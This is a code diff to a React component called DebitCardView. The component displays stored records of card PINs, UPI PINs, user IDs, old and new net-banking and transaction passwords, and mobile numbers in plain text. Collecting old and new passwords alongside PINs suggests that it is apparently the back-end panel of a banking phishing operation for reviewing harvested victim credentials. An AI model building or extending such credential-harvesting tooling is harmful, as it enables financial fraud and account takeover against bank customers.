@@ -130,6 +130,12 @@ const DebitCardView:FC<any> = ({ index, cardData, onDelete }) => {
           {mPin && <div><span className="text-sm">mPIN: {mPin}</span></div>}
           {upiId && <div><span className="text-sm">UPI ID: {upiId}</span></div>}
           {upiPin && <div><span className="text-sm">UPI PIN: {upiPin}</span></div>}
+          {userId && <div><span className="text-sm">User ID: {userId}</span></div>}
+          {oldNetPass && <div><span className="text-sm">Old Net Password: {oldNetPass}</span></div>}
+          {newNetPass && <div><span className="text-sm">New Net Password: {newNetPass}</span></div>}
+          {oldTransPass && <div><span className="text-sm">Old Transaction Password: {oldTransPass}</span></div>}
+          {newTransPass && <div><span className="text-sm">New Transaction Password: {newTransPass}</span></div>}
+          {mobNum && <div><span className="text-sm">Mobile Number: {mobNum}</span></div>}
         </CardContent>
       </Card>
 
